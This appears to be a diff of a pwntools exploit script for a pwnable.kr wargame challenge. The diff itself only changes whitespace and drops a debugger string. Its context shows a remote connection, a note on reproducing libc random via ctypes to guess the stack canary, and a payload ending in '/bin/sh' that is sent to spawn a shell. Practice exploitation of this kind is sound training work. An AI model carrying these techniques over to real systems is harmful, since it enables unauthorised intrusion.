@@ -1,4 +1,5 @@
 #!/usr/bin/python3
+
 from pwn import *
 from ctypes import CDLL
 from base64 import b64encode
@@ -11,9 +12,6 @@ slp = 1
 host = "pwnable.kr"
 port = 9002
 
-gs = '''
-continue
-'''
 def start():
     if args.REMOTE:
         io = remote(host, port)
@@ -63,7 +61,6 @@ ps: python implements random differently then libc does which results in a diffe
 when trying to figure out the canary, so in order to use the exact same random,
 we can load the libc random with CDLL from ctypes.
 '''
-
 
 
 # EXPLOIT CODE HERE:
@@ -142,7 +139,6 @@ b64_exp += b"==/bin/sh\0"
 
 io.sendline(b64_exp)
 print(io.recv())
-
 
 
 
